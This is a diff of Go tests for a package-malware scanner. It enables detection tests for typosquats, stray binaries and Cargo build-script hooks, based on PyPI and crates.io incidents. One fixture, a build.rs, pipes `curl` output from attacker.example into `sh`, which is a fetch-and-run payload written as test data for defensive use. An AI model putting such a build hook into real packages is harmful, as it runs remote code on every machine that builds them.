@@ -203,23 +203,30 @@ func TestIncidents_PyPI(t *testing.T) {
 	t.Run("colourama_2017 — typosquat of colorama", func(t *testing.T) {
 		// `colourama` (British spelling of colorama) shipped a clipboard
 		// hijacker that swapped Bitcoin addresses. Levenshtein-1 from the
-		// real package. Our typosquat detector is npm-only today.
-		t.Skip("typosquat detector is npm-only; add a curated pypi-top list and remove the EcoNpm guard")
-
-		// Once enabled:
-		// got := DetectTyposquat(domain.EcoPyPI, "colourama")
-		// if got != domain.CapTyposquatRisk {
-		// 	t.Fatalf("want CapTyposquatRisk for colourama, got %v", got)
-		// }
+		// real package. Plans D + E (detection-gaps-roadmap) added a
+		// per-ecosystem typosquat map and a curated PyPI top-list.
+		got := DetectTyposquat(domain.EcoPyPI, "colourama")
+		if got != domain.CapTyposquatRisk {
+			t.Fatalf("want CapTyposquatRisk for colourama, got %v", got)
+		}
 	})
 
 	t.Run("ultralytics_2024 — coinminer dropped into wheel", func(t *testing.T) {
 		// ultralytics 8.3.41/8.3.42 (Dec 2024): malicious GitHub Actions
-		// PR produced wheels containing a coinminer. The detection shape
-		// is the wheel containing a stray executable — but the binary
-		// dropper detector is npm-only today (PyPI wheels legitimately
-		// ship .so / native libs, so a denylist needs more nuance there).
-		t.Skip("binary-dropper detector is npm-only; extend with PyPI-aware nuance (allow .so for known C-ext packages, flag stray ELF outside expected paths)")
+		// PR produced wheels containing a coinminer. Plan I (detection-
+		// gaps-roadmap) added PyPI-aware nuance: .cpython-*.so / .abi3.so /
+		// .pyd / <pkg>/.libs/ paths are carved out as legitimate C-ext
+		// shapes; a stray binary outside those paths flags.
+		src := usecase.PackageSource{
+			Files: map[string][]byte{
+				"ultralytics/__init__.py":      []byte("from . import data"),
+				"ultralytics/data/.cache/xmrig.so": []byte("ELF\x7fdrop"),
+			},
+		}
+		got := DetectBinaryDropper(domain.EcoPyPI, src)
+		if got != domain.CapBinaryDropper {
+			t.Fatalf("want CapBinaryDropper for stray .so outside C-ext paths, got %v", got)
+		}
 	})
 }
 
@@ -302,29 +309,56 @@ func TestIncidents_Crates(t *testing.T) {
 	t.Run("rustdecimal_2022 — typosquat + GitLab token exfil", func(t *testing.T) {
 		// `rustdecimal` (Apr 2022): typosquat of `rust_decimal` (note the
 		// underscore vs no-underscore). Embedded a payload that looked for
-		// CI tokens in env and posted them outbound. Our typosquat detector
-		// is npm-only — same gap as colourama on PyPI.
-		t.Skip("typosquat detector is npm-only; add a curated crates.io-top list")
-
-		// Once enabled:
-		// got := DetectTyposquat(domain.EcoCrates, "rustdecimal")
-		// if got != domain.CapTyposquatRisk {
-		// 	t.Fatalf("want CapTyposquatRisk for rustdecimal, got %v", got)
-		// }
+		// CI tokens in env and posted them outbound. Plans D + F unblocked
+		// this — per-ecosystem typosquat map + curated crates.io top-list.
+		got := DetectTyposquat(domain.EcoCrates, "rustdecimal")
+		if got != domain.CapTyposquatRisk {
+			t.Fatalf("want CapTyposquatRisk for rustdecimal, got %v", got)
+		}
 	})
 
 	t.Run("xrvrv_2023 — build.rs runs remote shell", func(t *testing.T) {
 		// xrvrv-cluster crates (2023): each had a build.rs that fetched
-		// and exec'd a shell payload. build.rs IS Rust's npm-postinstall
-		// equivalent, but we don't currently parse Cargo.toml's
-		// `build = "build.rs"` declaration. Documented gap.
-		t.Skip("install-hook detector parses npm package.json scripts only; extend to recognise Cargo build = build.rs + scan that file")
+		// and exec'd a shell payload. Plans G + H (detection-gaps-roadmap)
+		// added DetectCargoBuildHook + wired it through Run for EcoCrates,
+		// so we now flag this on the same shape the npm install-hook
+		// detector recognises.
+		src := usecase.PackageSource{
+			Files: map[string][]byte{
+				"Cargo.toml": []byte(`[package]
+name = "xrvrv"
+build = "build.rs"`),
+				"build.rs": []byte(`fn main() {
+					std::process::Command::new("sh")
+						.arg("-c")
+						.arg("curl -sSL http://attacker.example/x | sh")
+						.status()
+						.ok();
+				}`),
+				"src/lib.rs": []byte(`pub fn add(a: i32, b: i32) -> i32 { a + b }`),
+			},
+		}
+		caps := Run(domain.EcoCrates, "xrvrv", nil, src)
+		if !hasCap(caps, domain.CapInstallHookSuspicious) {
+			t.Fatalf("want CapInstallHookSuspicious from build.rs, got %v", caps)
+		}
 	})
 
 	t.Run("big_decimal_2024 — precompiled .so / .dll smuggled into crate", func(t *testing.T) {
-		// Hypothetical typo-cluster crate that ships precompiled .so / .dll
-		// alongside source — a real npm-malware shape transplanted to a
-		// crate. Binary-dropper detector is npm-only today; documented gap.
-		t.Skip("binary-dropper detector is npm-only; extend to crates (legitimate -sys crates ship .a / .lib but not .so / .dll directly)")
+		// Plan J (detection-gaps-roadmap) extended the binary-dropper
+		// heuristic to crates: legitimate -sys crates ship .a / .lib
+		// (not on the suspiciousBinary list); precompiled .so / .dll /
+		// .dylib in a crate is the malware pattern.
+		src := usecase.PackageSource{
+			Files: map[string][]byte{
+				"Cargo.toml":  []byte(`[package]\nname = "big_decimal"`),
+				"src/lib.rs":  []byte(`pub fn add(a: i32, b: i32) -> i32 { a + b }`),
+				"native/x.so": []byte("ELF\x7fpayload"),
+			},
+		}
+		got := DetectBinaryDropper(domain.EcoCrates, src)
+		if got != domain.CapBinaryDropper {
+			t.Fatalf("want CapBinaryDropper for crate-shipped .so, got %v", got)
+		}
 	})
 }
